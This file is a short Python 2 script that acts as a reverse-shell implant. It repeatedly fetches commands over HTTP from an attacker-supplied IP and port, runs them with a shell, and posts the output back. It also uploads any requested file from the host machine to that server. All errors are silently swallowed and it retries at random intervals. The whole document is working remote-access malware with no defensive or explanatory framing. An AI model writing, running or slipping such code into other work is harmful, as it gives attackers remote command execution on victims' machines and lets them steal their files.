import sys
import requests
import subprocess
import time
import os
import base64
import random

url = ''


def b64e(x):
    return base64.b64encode(x)


def send_file(file_path):
    global url
    if os.path.isfile(file_path):
        files = {'file': open(file_path, 'rb')}
        requests.post(url+'/upload', files=files)
    elif os.path.isdir(file_path):
        requests.post(url, data=b64e('REMOTE_FILE_IS_A_DIRECTORY'))
    else:
        requests.post(url, data=b64e('REMOTE_FILE_NOT_EXIST'))


def main():
    global url

    if len(sys.argv) < 3:
        print '[!] Usage: ', __file__, ' <ip> <port>'
        return

    sys.argv = sys.argv[1:]
    url = 'http://' + sys.argv[0] + ':' + sys.argv[1]
    while True:
        try:
            request = requests.get(url)
            command = request.text

            command_split = command.split(' ', 1)
            action = command_split[0].lower()
            if len(command_split) == 2:
                args = command_split[1]
            else:
                args = ''

            if 'exit' in action:
                break
            elif 'download' in action:
                send_file(args)
            else:
                cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                requests.post(url=url, data=cmd.stdout.read())
                requests.post(url=url, data=cmd.stderr.read())

            time.sleep(3)
        except:
            sleep_time = random.randrange(1,10)
            time.sleep(sleep_time)

main()
